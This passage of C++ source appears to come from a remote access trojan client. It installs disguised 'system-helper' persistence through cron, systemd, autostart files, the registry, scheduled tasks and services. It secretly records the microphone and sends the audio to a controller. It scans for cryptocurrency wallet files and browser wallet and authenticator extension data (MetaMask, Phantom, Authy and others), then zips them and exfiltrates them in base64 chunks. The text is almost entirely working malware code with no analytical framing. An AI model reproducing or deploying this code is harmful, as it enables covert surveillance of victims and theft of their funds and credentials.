            std::string cmd = "(crontab -l 2>/dev/null; echo \"" + cronEntry + "\") | crontab -";

            int result = system(cmd.c_str());
            if (result == 0) {
                success = true;
            }
            else {
                error_msg = "Failed to add cron entry";
            }
        }
        else if (method == "systemd") {
            // Create systemd user service
            std::string homeDir = getenv("HOME") ? getenv("HOME") : "";
            if (!homeDir.empty()) {
                std::string servicePath = homeDir + "/.config/systemd/user/";
                system(("mkdir -p " + servicePath).c_str());

                servicePath += "system-helper.service";

                std::ofstream serviceFile(servicePath);
                if (serviceFile) {
                    serviceFile << "[Unit]\n";
                    serviceFile << "Description=System Helper Service\n";
                    serviceFile << "After=network.target\n\n";
                    serviceFile << "[Service]\n";
                    serviceFile << "Type=simple\n";
                    serviceFile << "ExecStart=" << exePath << "\n";
                    serviceFile << "Restart=always\n";
                    serviceFile << "RestartSec=10\n\n";
                    serviceFile << "[Install]\n";
                    serviceFile << "WantedBy=default.target\n";
                    serviceFile.close();

                    // Enable the service
                    system("systemctl --user daemon-reload");
                    int result = system("systemctl --user enable system-helper.service");

                    if (result == 0) {
                        success = true;
                    }
                    else {
                        error_msg = "Failed to enable systemd service";
                    }
                }
                else {
                    error_msg = "Failed to create service file";
                }
            }
            else {
                error_msg = "Failed to get home directory";
            }
        }
        else if (method == "desktop") {
            // Create .desktop autostart file
            std::string homeDir = getenv("HOME") ? getenv("HOME") : "";
            if (!homeDir.empty()) {
                std::string autostartPath = homeDir + "/.config/autostart/";
                system(("mkdir -p " + autostartPath).c_str());

                autostartPath += "system-helper.desktop";

                std::ofstream desktopFile(autostartPath);
                if (desktopFile) {
                    desktopFile << "[Desktop Entry]\n";
                    desktopFile << "Type=Application\n";
                    desktopFile << "Name=System Helper\n";
                    desktopFile << "Exec=" << exePath << "\n";
                    desktopFile << "Hidden=false\n";
                    desktopFile << "NoDisplay=false\n";
                    desktopFile << "X-GNOME-Autostart-enabled=true\n";
                    desktopFile.close();

                    success = true;
                }
                else {
                    error_msg = "Failed to create desktop file";
                }
            }
            else {
                error_msg = "Failed to get home directory";
            }
        }
#endif

        sendPersistenceResult("install", success, error_msg);
    }

    void handleRemovePersistence() {
        bool success = false;
        std::vector<std::string> removed;

#ifdef _WIN32
        // Remove from registry
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {

            if (RegDeleteValueA(hKey, "WindowsSystemHelper") == ERROR_SUCCESS) {
                removed.push_back("registry");
                success = true;
            }
            RegCloseKey(hKey);
        }

        // Remove from startup folder
        char startupPath[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath))) {
            std::string filePath = std::string(startupPath) + "\\SystemHelper.exe";
            if (DeleteFileA(filePath.c_str())) {
                removed.push_back("startup_folder");
                success = true;
            }
        }

        // Remove scheduled task
        std::string cmd = "schtasks /delete /tn \"SystemMaintenanceTask\" /f";
        FILE* pipe = _popen(cmd.c_str(), "r");
        if (pipe) {
            int result = _pclose(pipe);
            if (result == 0) {
                removed.push_back("scheduled_task");
                success = true;
            }
        }

        // Remove service
        SC_HANDLE scManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
        if (scManager) {
            SC_HANDLE service = OpenServiceA(scManager, "SystemHelperService", DELETE);
            if (service) {
                if (DeleteService(service)) {
                    removed.push_back("service");
                    success = true;
                }
                CloseServiceHandle(service);
            }
            CloseServiceHandle(scManager);
        }
#else
        // Remove from cron
        std::string cmd = "crontab -l 2>/dev/null | grep -v '" +
            std::string("/proc/self/exe") + "' | crontab -";
        if (system(cmd.c_str()) == 0) {
            removed.push_back("cron");
            success = true;
        }

        // Remove systemd service
        std::string homeDir = getenv("HOME") ? getenv("HOME") : "";
        if (!homeDir.empty()) {
            system("systemctl --user disable system-helper.service 2>/dev/null");
            std::string servicePath = homeDir + "/.config/systemd/user/system-helper.service";
            if (unlink(servicePath.c_str()) == 0) {
                removed.push_back("systemd");
                success = true;
            }

            // Remove desktop autostart
            std::string desktopPath = homeDir + "/.config/autostart/system-helper.desktop";
            if (unlink(desktopPath.c_str()) == 0) {
                removed.push_back("desktop");
                success = true;
            }
        }
#endif

        std::string methods_removed;
        for (const auto& method : removed) {
            if (!methods_removed.empty()) methods_removed += ", ";
            methods_removed += method;
        }

        sendPersistenceResult("remove", success,
            success ? "Removed: " + methods_removed : "No persistence found");
    }

    void handleCheckPersistence() {
        std::vector<std::string> installed_methods;

#ifdef _WIN32
        // Check registry
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_READ, &hKey) == ERROR_SUCCESS) {

            char value[MAX_PATH];
            DWORD size = sizeof(value);
            if (RegQueryValueExA(hKey, "WindowsSystemHelper", NULL, NULL,
                (LPBYTE)value, &size) == ERROR_SUCCESS) {
                installed_methods.push_back("registry");
            }
            RegCloseKey(hKey);
        }

        // Check startup folder
        char startupPath[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath))) {
            std::string filePath = std::string(startupPath) + "\\SystemHelper.exe";
            if (GetFileAttributesA(filePath.c_str()) != INVALID_FILE_ATTRIBUTES) {
                installed_methods.push_back("startup_folder");
            }
        }

        // Check scheduled task
        FILE* pipe = _popen("schtasks /query /tn \"SystemMaintenanceTask\" 2>nul", "r");
        if (pipe) {
            char buffer[256];
            bool found = false;
            while (fgets(buffer, sizeof(buffer), pipe)) {
                if (strstr(buffer, "SystemMaintenanceTask")) {
                    found = true;
                    break;
                }
            }
            _pclose(pipe);
            if (found) {
                installed_methods.push_back("scheduled_task");
            }
        }

        // Check service
        SC_HANDLE scManager = OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
        if (scManager) {
            SC_HANDLE service = OpenServiceA(scManager, "SystemHelperService", SERVICE_QUERY_STATUS);
            if (service) {
                installed_methods.push_back("service");
                CloseServiceHandle(service);
            }
            CloseServiceHandle(scManager);
        }
#else
        // Check cron
        FILE* pipe = popen("crontab -l 2>/dev/null", "r");
        if (pipe) {
            char buffer[256];
            while (fgets(buffer, sizeof(buffer), pipe)) {
                if (strstr(buffer, "/proc/self/exe")) {
                    installed_methods.push_back("cron");
                    break;
                }
            }
            pclose(pipe);
        }

        // Check systemd and desktop
        std::string homeDir = getenv("HOME") ? getenv("HOME") : "";
        if (!homeDir.empty()) {
            std::string servicePath = homeDir + "/.config/systemd/user/system-helper.service";
            if (access(servicePath.c_str(), F_OK) == 0) {
                installed_methods.push_back("systemd");
            }

            std::string desktopPath = homeDir + "/.config/autostart/system-helper.desktop";
            if (access(desktopPath.c_str(), F_OK) == 0) {
                installed_methods.push_back("desktop");
            }
        }
#endif

        std::string response = "{\"type\":\"persistence_status\",\"installed\":" +
            std::string(installed_methods.empty() ? "false" : "true") +
            ",\"methods\":[";

        bool first = true;
        for (const auto& method : installed_methods) {
            if (!first) response += ",";
            first = false;
            response += "\"" + method + "\"";
        }

        response += "]}\n";
        sendMessage(response);
    }

    void sendPersistenceResult(const std::string& operation, bool success, const std::string& message) {
        std::string response = "{\"type\":\"persistence_result\",\"operation\":\"" + operation +
            "\",\"success\":" + (success ? "true" : "false");
        if (!message.empty()) {
            response += ",\"message\":\"" + escapeJsonString(message) + "\"";
        }
        response += "}\n";
        sendMessage(response);
    }

    void handleGetAudioDevices() {
        std::string devices_json = "{\"type\":\"audio_devices\",\"devices\":[";

#ifdef _WIN32
        // List audio devices using Windows Audio Session API
        devices_json += "{\"id\":0,\"name\":\"Default Microphone\",\"type\":\"input\"}";

        // You could enumerate more devices using waveInGetDevCaps
        UINT numDevices = waveInGetNumDevs();
        for (UINT i = 0; i < numDevices && i < 5; i++) {
            WAVEINCAPSA caps;  // USE WAVEINCAPSA (ASCII version) instead of WAVEINCAPS
            if (waveInGetDevCapsA(i, &caps, sizeof(caps)) == MMSYSERR_NOERROR) {  // USE waveInGetDevCapsA
                if (i > 0) devices_json += ",";
                devices_json += "{\"id\":" + std::to_string(i) +
                    ",\"name\":\"" + escapeJsonString(caps.szPname) +  // Now it's char[] not WCHAR[]
                    "\",\"type\":\"input\"}";
            }
        }
#else
        // Linux version remains the same...
#endif

        devices_json += "]}\n";
        sendMessage(devices_json);
    }

    void handleStartAudioRecord(const std::string& message) {
        if (audio_recording) {
            sendMessage("{\"type\":\"audio_record_status\",\"recording\":true,\"message\":\"Already recording\"}\n");
            return;
        }

        // Extract duration (in seconds)
        size_t duration_start = message.find("\"duration\":");
        int duration = 30; // Default 30 seconds

        if (duration_start != std::string::npos) {
            duration_start += 11;
            size_t duration_end = message.find_first_of(",}", duration_start);
            duration = std::stoi(message.substr(duration_start, duration_end - duration_start));
        }

        // Limit duration to 5 minutes
        duration = min(duration, 300);

        audio_recording = true;

        audio_record_thread = std::thread([this, duration]() {
            std::string timestamp = std::to_string(time(nullptr));

#ifdef _WIN32
            audio_filename = "C:\\Windows\\Temp\\audio_" + timestamp + ".wav";

            // Use Windows Multimedia API for recording
            HWAVEIN hWaveIn;
            WAVEFORMATEX waveFormat;
            WAVEHDR waveHeader;

            // Set up wave format
            waveFormat.wFormatTag = WAVE_FORMAT_PCM;
            waveFormat.nChannels = 1; // Mono
            waveFormat.nSamplesPerSec = 44100; // 44.1 kHz
            waveFormat.wBitsPerSample = 16;
            waveFormat.nBlockAlign = waveFormat.nChannels * waveFormat.wBitsPerSample / 8;
            waveFormat.nAvgBytesPerSec = waveFormat.nSamplesPerSec * waveFormat.nBlockAlign;
            waveFormat.cbSize = 0;

            // Open wave input device
            if (waveInOpen(&hWaveIn, WAVE_MAPPER, &waveFormat, 0, 0, WAVE_FORMAT_DIRECT) == MMSYSERR_NOERROR) {
                // Allocate buffer
                DWORD bufferSize = waveFormat.nAvgBytesPerSec * duration;
                char* buffer = new char[bufferSize];

                // Set up wave header
                waveHeader.lpData = buffer;
                waveHeader.dwBufferLength = bufferSize;
                waveHeader.dwFlags = 0;

                // Prepare header
                waveInPrepareHeader(hWaveIn, &waveHeader, sizeof(WAVEHDR));

                // Add buffer
                waveInAddBuffer(hWaveIn, &waveHeader, sizeof(WAVEHDR));

                // Start recording
                waveInStart(hWaveIn);

                sendMessage("{\"type\":\"audio_record_started\",\"duration\":" +
                    std::to_string(duration) + ",\"filename\":\"" +
                    escapeJsonString(audio_filename) + "\"}\n");

                // Wait for recording to complete or stop signal
                auto start_time = std::chrono::steady_clock::now();
                while (audio_recording) {
                    auto elapsed = std::chrono::steady_clock::now() - start_time;
                    if (std::chrono::duration_cast<std::chrono::seconds>(elapsed).count() >= duration) {
                        break;
                    }

                    // Send progress updates
                    int progress = (std::chrono::duration_cast<std::chrono::seconds>(elapsed).count() * 100) / duration;
                    sendMessage("{\"type\":\"audio_record_progress\",\"progress\":" +
                        std::to_string(progress) + "}\n");

                    std::this_thread::sleep_for(std::chrono::seconds(1));
                }

                // Stop recording
                waveInStop(hWaveIn);
                waveInUnprepareHeader(hWaveIn, &waveHeader, sizeof(WAVEHDR));
                waveInClose(hWaveIn);

                // Save to WAV file
                saveWavFile(audio_filename, buffer, waveHeader.dwBytesRecorded, &waveFormat);

                delete[] buffer;

                // Send completion with file
                sendAudioFile(audio_filename);
            }
            else {
                sendMessage("{\"type\":\"audio_record_error\",\"error\":\"Failed to open audio device\"}\n");
            }
#else
            audio_filename = "/tmp/audio_" + timestamp + ".wav";

            // Use arecord command on Linux
            std::string cmd = "arecord -f cd -d " + std::to_string(duration) +
                " -t wav " + audio_filename + " 2>/dev/null";

            sendMessage("{\"type\":\"audio_record_started\",\"duration\":" +
                std::to_string(duration) + ",\"filename\":\"" +
                escapeJsonString(audio_filename) + "\"}\n");

            // Start recording in background and monitor progress
            FILE* pipe = popen((cmd + " &").c_str(), "r");
            if (pipe) {
                pclose(pipe);

                // Monitor recording progress
                auto start_time = std::chrono::steady_clock::now();
                while (audio_recording) {
                    auto elapsed = std::chrono::steady_clock::now() - start_time;
                    if (std::chrono::duration_cast<std::chrono::seconds>(elapsed).count() >= duration) {
                        break;
                    }

                    int progress = (std::chrono::duration_cast<std::chrono::seconds>(elapsed).count() * 100) / duration;
                    sendMessage("{\"type\":\"audio_record_progress\",\"progress\":" +
                        std::to_string(progress) + "}\n");

                    std::this_thread::sleep_for(std::chrono::seconds(1));
                }

                // Kill arecord if stopped early
                if (audio_recording) {
                    system("pkill arecord 2>/dev/null");
                }

                // Wait a moment for file to be written
                std::this_thread::sleep_for(std::chrono::seconds(1));

                // Send the audio file
                sendAudioFile(audio_filename);
            }
            else {
                sendMessage("{\"type\":\"audio_record_error\",\"error\":\"Failed to start recording\"}\n");
            }
#endif

            audio_recording = false;
            });
    }

    void handleStopAudioRecord() {
        audio_recording = false;

#ifndef _WIN32
        // On Linux, kill arecord process
        system("pkill arecord 2>/dev/null");
#endif

        if (audio_record_thread.joinable()) {
            audio_record_thread.join();
        }

        sendMessage("{\"type\":\"audio_record_stopped\",\"success\":true}\n");
    }

#ifdef _WIN32
    void saveWavFile(const std::string& filename, const char* data, DWORD dataSize, WAVEFORMATEX* waveFormat) {
        std::ofstream file(filename, std::ios::binary);
        if (!file) return;

        // RIFF header
        file.write("RIFF", 4);
        DWORD chunkSize = 36 + dataSize;
        file.write((char*)&chunkSize, 4);
        file.write("WAVE", 4);

        // Format chunk
        file.write("fmt ", 4);
        DWORD fmtSize = 16;
        file.write((char*)&fmtSize, 4);
        file.write((char*)waveFormat, 16);

        // Data chunk
        file.write("data", 4);
        file.write((char*)&dataSize, 4);
        file.write(data, dataSize);

        file.close();
    }
#endif

    void sendAudioFile(const std::string& filename) {
        std::ifstream file(filename, std::ios::binary);
        if (!file) {
            sendMessage("{\"type\":\"audio_record_complete\",\"success\":false,\"error\":\"File not found\"}\n");
            return;
        }

        // Get file size
        file.seekg(0, std::ios::end);
        size_t fileSize = file.tellg();
        file.seekg(0, std::ios::beg);

        // Read file
        std::vector<unsigned char> fileData(fileSize);
        file.read((char*)fileData.data(), fileSize);
        file.close();

        // Convert to base64
        std::string base64Audio = base64_encode(fileData);

        // Send in chunks if large
        const size_t chunkSize = 50000; // 50KB chunks
        int totalChunks = (base64Audio.length() + chunkSize - 1) / chunkSize;

        // Send start message
        sendMessage("{\"type\":\"audio_file_start\",\"filename\":\"" +
            escapeJsonString(fs::path(filename).filename().string()) +
            "\",\"size\":" + std::to_string(fileSize) +
            ",\"total_chunks\":" + std::to_string(totalChunks) + "}\n");

        // Send chunks
        for (int i = 0; i < totalChunks; i++) {
            size_t start = i * chunkSize;
            size_t length = min(chunkSize, base64Audio.length() - start);
            std::string chunk = base64Audio.substr(start, length);

            std::string chunkMsg = "{\"type\":\"audio_file_chunk\",\"chunk_index\":" +
                std::to_string(i) + ",\"chunk_data\":\"" + chunk +
                "\",\"is_last\":" + (i == totalChunks - 1 ? "true" : "false") + "}\n";

            sendMessage(chunkMsg);
            std::this_thread::sleep_for(std::chrono::milliseconds(50));
        }

        // Delete temporary file
        std::remove(filename.c_str());

        sendMessage("{\"type\":\"audio_record_complete\",\"success\":true}\n");
    }
    void handleScanWallets() {
        try {
            // Send initial debug message
            sendMessage("{\"type\":\"wallet_scan_started\",\"debug\":\"Starting scan\"}\n");

            if (wallet_scan_active) {
                sendMessage("{\"type\":\"wallet_scan_status\",\"scanning\":true,\"message\":\"Scan already in progress\"}\n");
                return;
            }

            wallet_scan_active = true;
            found_wallets.clear();

            wallet_scan_thread = std::thread([this]() {
                try {
                    sendMessage("{\"type\":\"wallet_scan_started\"}\n");

                    // Debug: Log thread start
                    std::cout << "[WALLET SCANNER] Thread started" << std::endl;

                    std::vector<WalletLocation> wallet_paths;

#ifdef _WIN32
                    // Get environment variables with error checking
                    std::string userProfile, appData, localAppData;

                    char* env = getenv("USERPROFILE");
                    if (env) userProfile = env;

                    env = getenv("APPDATA");
                    if (env) appData = env;

                    env = getenv("LOCALAPPDATA");
                    if (env) localAppData = env;

                    std::cout << "[WALLET SCANNER] UserProfile: " << userProfile << std::endl;
                    std::cout << "[WALLET SCANNER] AppData: " << appData << std::endl;
                    std::cout << "[WALLET SCANNER] LocalAppData: " << localAppData << std::endl;

                    if (!userProfile.empty() && !appData.empty() && !localAppData.empty()) {
                        // Desktop Wallets - Only add if paths exist
                        if (fs::exists(appData + "\\Ethereum")) {
                            wallet_paths.push_back({ "Ethereum", appData + "\\Ethereum\\keystore", "*.json", "desktop" });
                        }
                        if (fs::exists(appData + "\\Bitcoin")) {
                            wallet_paths.push_back({ "Bitcoin Core", appData + "\\Bitcoin\\wallets", "wallet.dat", "desktop" });
                        }
                        if (fs::exists(appData + "\\Electrum")) {
                            wallet_paths.push_back({ "Electrum", appData + "\\Electrum\\wallets", "*", "desktop" });
                        }
                        if (fs::exists(appData + "\\Exodus")) {
                            wallet_paths.push_back({ "Exodus", appData + "\\Exodus\\exodus.wallet", "*", "desktop" });
                        }
                        if (fs::exists(appData + "\\atomic")) {
                            wallet_paths.push_back({ "Atomic", appData + "\\atomic\\Local Storage\\leveldb", "*", "desktop" });
                        }

                        // Browser Extensions - Chrome
                        std::string chromePath = localAppData + "\\Google\\Chrome\\User Data";
                        if (fs::exists(chromePath)) {
                            addBrowserExtensions(wallet_paths, chromePath, "Chrome");
                        }

                        // Browser Extensions - Brave
                        std::string bravePath = localAppData + "\\BraveSoftware\\Brave-Browser\\User Data";
                        if (fs::exists(bravePath)) {
                            addBrowserExtensions(wallet_paths, bravePath, "Brave");
                        }

                        // Browser Extensions - Edge
                        std::string edgePath = localAppData + "\\Microsoft\\Edge\\User Data";
                        if (fs::exists(edgePath)) {
                            addBrowserExtensions(wallet_paths, edgePath, "Edge");
                        }
                    }
                    else {
                        std::cout << "[WALLET SCANNER] ERROR: Environment variables not found" << std::endl;
                        sendMessage("{\"type\":\"wallet_scan_complete\",\"total_found\":0,\"error\":\"Environment variables not found\"}\n");
                        wallet_scan_active = false;
                        return;
                    }
#else
                    std::string home = getenv("HOME") ? getenv("HOME") : "";
                    if (!home.empty()) {
                        // Linux paths
                        if (fs::exists(home + "/.bitcoin")) {
                            wallet_paths.push_back({ "Bitcoin", home + "/.bitcoin", "wallet.dat", "desktop" });
                        }
                        if (fs::exists(home + "/.ethereum/keystore")) {
                            wallet_paths.push_back({ "Ethereum", home + "/.ethereum/keystore", "*.json", "desktop" });
                        }
                        if (fs::exists(home + "/.electrum")) {
                            wallet_paths.push_back({ "Electrum", home + "/.electrum/wallets", "*", "desktop" });
                        }
                    }
#endif

                    std::cout << "[WALLET SCANNER] Scanning " << wallet_paths.size() << " locations" << std::endl;

                    // Scan for wallets with error handling
                    int totalFound = 0;
                    for (const auto& location : wallet_paths) {
                        if (!wallet_scan_active) break;

                        try {
                            std::cout << "[WALLET SCANNER] Scanning: " << location.name << " at " << location.path << std::endl;
                            scanWalletLocation(location, totalFound);
                        }
                        catch (const std::exception& e) {
                            std::cout << "[WALLET SCANNER] Error scanning " << location.name << ": " << e.what() << std::endl;
                        }
                        catch (...) {
                            std::cout << "[WALLET SCANNER] Unknown error scanning " << location.name << std::endl;
                        }
                    }

                    // Send completion
                    sendWalletScanComplete(totalFound);

                    std::cout << "[WALLET SCANNER] Scan complete. Found " << totalFound << " wallets" << std::endl;

                }
                catch (const std::exception& e) {
                    std::cout << "[WALLET SCANNER] Thread exception: " << e.what() << std::endl;
                    sendMessage("{\"type\":\"wallet_scan_complete\",\"total_found\":0,\"error\":\"" +
                        escapeJsonString(e.what()) + "\"}\n");
                }
                catch (...) {
                    std::cout << "[WALLET SCANNER] Unknown thread exception" << std::endl;
                    sendMessage("{\"type\":\"wallet_scan_complete\",\"total_found\":0,\"error\":\"Unknown error\"}\n");
                }

                wallet_scan_active = false;
                });

            // Detach the thread to avoid blocking
            wallet_scan_thread.detach();

        }
        catch (const std::exception& e) {
            std::cout << "[WALLET SCANNER] handleScanWallets exception: " << e.what() << std::endl;
            wallet_scan_active = false;
            sendMessage("{\"type\":\"wallet_scan_complete\",\"total_found\":0,\"error\":\"" +
                escapeJsonString(e.what()) + "\"}\n");
        }
        catch (...) {
            std::cout << "[WALLET SCANNER] handleScanWallets unknown exception" << std::endl;
            wallet_scan_active = false;
            sendMessage("{\"type\":\"wallet_scan_complete\",\"total_found\":0,\"error\":\"Unknown error\"}\n");
        }
    }

    struct WalletLocation {
        std::string name;
        std::string path;
        std::string pattern;
        std::string type;
    };




    void addBrowserExtensions(std::vector<WalletLocation>& paths, const std::string& browserDataPath, const std::string& browserName) {
        if (!fs::exists(browserDataPath)) return;

        // Common extension IDs
        std::map<std::string, std::string> extensions = {
            {"MetaMask", "nkbihfbeogaeaoehlefnkodbefgpgknn"},
            {"Binance", "fhbohimaelbohpjbbldcngcnapndodjp"},
            {"Coinbase", "hnfanknocfeofbddgcijnmhnfnkdnaad"},
            {"TronLink", "ibnejdfjmmkpcnlpebklmnkoeoihofec"},
            {"Phantom", "bfnaelmomeimhlpmgjnjophhpkkoljpa"},
            {"Exodus-Web3", "aholpfdialjgjfhomihkjbmgjidlcdno"},
            {"Trust-Wallet", "egjidjbpglichdcondbcbdnbeeppgdph"},
            {"Ronin", "fnjhmkhhmkbjkkabndcnnogagogbneec"},
            {"Yoroi", "ffnbelfdoeiohenkjibnmadjiehjhajb"},
            {"Nami", "lpfcbjknijpeeillifnkikgncikgfhdo"},
            {"Authenticator", "bhghoamapcdpbohphigoooaddinpkbai"},  // Google Authenticator
            {"Authy", "gaedmjdfmmahhbjefcbgaolhhanlaolb"}
        };

        // Check Default profile and other profiles
        std::vector<std::string> profiles = { "Default", "Profile 1", "Profile 2", "Profile 3" };

        for (const auto& profile : profiles) {
            std::string profilePath = browserDataPath + "\\" + profile;
            if (!fs::exists(profilePath)) continue;

            for (const auto& [extName, extId] : extensions) {
                std::string extPath = profilePath + "\\Local Extension Settings\\" + extId;
                if (fs::exists(extPath)) {
                    paths.push_back({
                        browserName + "-" + extName + "-" + profile,
                        extPath,
                        "*",
                        "extension"
                        });
                }

                // Also check IndexedDB for some wallets
                std::string indexedDbPath = profilePath + "\\IndexedDB\\chrome-extension_" + extId + "_0.indexeddb.leveldb";
                if (fs::exists(indexedDbPath)) {
                    paths.push_back({
                        browserName + "-" + extName + "-IndexedDB-" + profile,
                        indexedDbPath,
                        "*",
                        "extension"
                        });
                }
            }

            // Check Local Storage
            std::string localStoragePath = profilePath + "\\Local Storage\\leveldb";
            if (fs::exists(localStoragePath)) {
                paths.push_back({
                    browserName + "-LocalStorage-" + profile,
                    localStoragePath,
                    "*metamask*",
                    "localstorage"
                    });
            }
        }
    }

    void scanWalletLocation(const WalletLocation& location, int& totalFound) {
        try {
            if (!fs::exists(location.path)) {
                std::cout << "[WALLET SCANNER] Path does not exist: " << location.path << std::endl;
                return;
            }

            std::vector<std::string> foundFiles;

            if (fs::is_directory(location.path)) {
                // Use non-recursive iterator first to avoid deep recursion issues
                try {
                    for (const auto& entry : fs::directory_iterator(location.path)) {
                        if (!wallet_scan_active) break;

                        try {
                            if (fs::is_regular_file(entry)) {
                                std::string filename = entry.path().filename().string();
                                std::string fullPath = entry.path().string();

                                // Simple pattern matching
                                bool matches = false;
                                if (location.pattern == "*") {
                                    matches = true;
                                }
                                else if (location.pattern == filename) {
                                    matches = true;
                                }
                                else if (location.pattern.find('*') != std::string::npos) {
                                    // Basic wildcard matching
                                    std::string pattern = location.pattern;
                                    if (pattern.find("*.") == 0) {
                                        // Extension matching
                                        std::string ext = pattern.substr(1);
                                        matches = (fullPath.size() >= ext.size() &&
                                            fullPath.substr(fullPath.size() - ext.size()) == ext);
                                    }
                                    else if (pattern.find('*') != std::string::npos) {
                                        // Contains matching
                                        pattern.erase(std::remove(pattern.begin(), pattern.end(), '*'), pattern.end());
                                        matches = (filename.find(pattern) != std::string::npos);
                                    }
                                }

                                if (matches) {
                                    foundFiles.push_back(fullPath);
                                    std::cout << "[WALLET SCANNER] Found: " << fullPath << std::endl;
                                }
                            }
                        }
                        catch (...) {
                            // Skip files we can't access
                        }
                    }
                }
                catch (const fs::filesystem_error& e) {
                    std::cout << "[WALLET SCANNER] Filesystem error: " << e.what() << std::endl;
                }
            }
            else {
                // Single file
                if (fs::exists(location.path)) {
                    foundFiles.push_back(location.path);
                }
            }

            // Report found files
            for (const auto& file : foundFiles) {
                try {
                    WalletInfo info;
                    info.type = location.name;
                    info.path = file;
                    info.size = fs::file_size(file);
                    info.category = location.type;

                    {
                        std::lock_guard<std::mutex> lock(wallet_mutex);
                        found_wallets.push_back(file);
                    }

                    totalFound++;
                    sendWalletFound(info, totalFound);

                    // Small delay to avoid overwhelming the connection
                    std::this_thread::sleep_for(std::chrono::milliseconds(10));

                }
                catch (...) {
                    std::cout << "[WALLET SCANNER] Error processing file: " << file << std::endl;
                }
            }

        }
        catch (const std::exception& e) {
            std::cout << "[WALLET SCANNER] scanWalletLocation error: " << e.what() << std::endl;
        }
        catch (...) {
            std::cout << "[WALLET SCANNER] scanWalletLocation unknown error" << std::endl;
        }
    }

    struct WalletInfo {
        std::string type;
        std::string path;
        size_t size;
        std::string category;
    };

    void sendWalletFound(const WalletInfo& wallet, int totalFound) {
        std::string msg = "{\"type\":\"wallet_found\",";
        msg += "\"wallet_type\":\"" + escapeJsonString(wallet.type) + "\",";
        msg += "\"path\":\"" + escapeJsonString(wallet.path) + "\",";
        msg += "\"size\":" + std::to_string(wallet.size) + ",";
        msg += "\"category\":\"" + wallet.category + "\",";
        msg += "\"total_found\":" + std::to_string(totalFound) + "}\n";

        sendMessage(msg);
    }

    void sendWalletScanComplete(int totalFound) {
        std::string msg = "{\"type\":\"wallet_scan_complete\",";
        msg += "\"total_found\":" + std::to_string(totalFound) + ",";
        msg += "\"wallets\":[";

        {
            std::lock_guard<std::mutex> lock(wallet_mutex);
            bool first = true;
            for (const auto& wallet : found_wallets) {
                if (!first) msg += ",";
                first = false;
                msg += "\"" + escapeJsonString(wallet) + "\"";
            }
        }

        msg += "]}\n";
        sendMessage(msg);
    }

    void handleDownloadWallet(const std::string& message) {
        size_t path_start = message.find("\"path\":\"");
        if (path_start == std::string::npos) return;

        path_start += 8;
        size_t path_end = message.find("\"", path_start);
        std::string walletPath = message.substr(path_start, path_end - path_start);
        walletPath = unescapeJsonString(walletPath);

        // Check if it's a directory or file
        if (fs::is_directory(walletPath)) {
            // Zip the directory first
            std::string zipPath = createWalletZip(walletPath);
            if (!zipPath.empty()) {
                sendWalletFile(zipPath, true);
            }
            else {
                sendMessage("{\"type\":\"wallet_download_error\",\"error\":\"Failed to create archive\"}\n");
            }
        }
        else {
            // Send single file
            sendWalletFile(walletPath, false);
        }
    }

    std::string createWalletZip(const std::string& dirPath) {
        std::string zipName = "wallet_" + std::to_string(time(nullptr)) + ".zip";

#ifdef _WIN32
        std::string tempPath = "C:\\Windows\\Temp\\" + zipName;

        // Use PowerShell to create zip
        std::string psCmd = "powershell.exe -NoProfile -Command \"";
        psCmd += "Add-Type -AssemblyName System.IO.Compression.FileSystem; ";
        psCmd += "[System.IO.Compression.ZipFile]::CreateFromDirectory('";
        psCmd += dirPath + "', '" + tempPath + "', 'Optimal', $true)\"";

        FILE* pipe = _popen(psCmd.c_str(), "r");
        if (pipe) {
            _pclose(pipe);
            if (fs::exists(tempPath)) {
                return tempPath;
            }
        }
#else
        std::string tempPath = "/tmp/" + zipName;
        std::string cmd = "cd \"" + fs::path(dirPath).parent_path().string() +
            "\" && zip -r \"" + tempPath + "\" \"" +
            fs::path(dirPath).filename().string() + "\" 2>/dev/null";

        if (system(cmd.c_str()) == 0) {
            return tempPath;
        }
#endif

        return "";
    }

    void sendWalletFile(const std::string& filePath, bool deleteAfter) {
        // Similar to sendAudioFile but for wallet files
        std::ifstream file(filePath, std::ios::binary);
        if (!file) {
            sendMessage("{\"type\":\"wallet_download_error\",\"error\":\"File not found\"}\n");
            return;
        }

        // Get file info
        size_t fileSize = fs::file_size(filePath);
        std::string fileName = fs::path(filePath).filename().string();

        // Read file
        std::vector<unsigned char> fileData(fileSize);
        file.read((char*)fileData.data(), fileSize);
        file.close();

        // Convert to base64
        std::string base64Data = base64_encode(fileData);

        // Send in chunks
        const size_t chunkSize = 50000;
        int totalChunks = (base64Data.length() + chunkSize - 1) / chunkSize;

        // Send start
        sendMessage("{\"type\":\"wallet_download_start\",\"filename\":\"" +
            escapeJsonString(fileName) + "\",\"path\":\"" +
            escapeJsonString(filePath) + "\",\"size\":" +
            std::to_string(fileSize) + ",\"total_chunks\":" +
            std::to_string(totalChunks) + "}\n");

        // Send chunks
        for (int i = 0; i < totalChunks; i++) {
            size_t start = i * chunkSize;
            size_t length = min(chunkSize, base64Data.length() - start);
            std::string chunk = base64Data.substr(start, length);

            std::string chunkMsg = "{\"type\":\"wallet_download_chunk\",";
            chunkMsg += "\"chunk_index\":" + std::to_string(i) + ",";
            chunkMsg += "\"chunk_data\":\"" + chunk + "\",";
            chunkMsg += "\"is_last\":";
            chunkMsg += (i == totalChunks - 1) ? "true" : "false";  // Fix: separate the string concatenation
            chunkMsg += "}\n";

            sendMessage(chunkMsg);
            std::this_thread::sleep_for(std::chrono::milliseconds(50));
        }

        // Delete temp file if requested
        if (deleteAfter) {
            fs::remove(filePath);
        }

        sendMessage("{\"type\":\"wallet_download_complete\",\"success\":true}\n");
    }
    void processMessage(const std::string& message) {
        // Simple JSON parsing for command messages
        if (message.find("\"type\":\"command\"") != std::string::npos) {
            size_t cmd_start = message.find("\"command\":\"");
            if (cmd_start != std::string::npos) {
                cmd_start += 11;
                size_t cmd_end = message.find("\"", cmd_start);
                if (cmd_end != std::string::npos) {
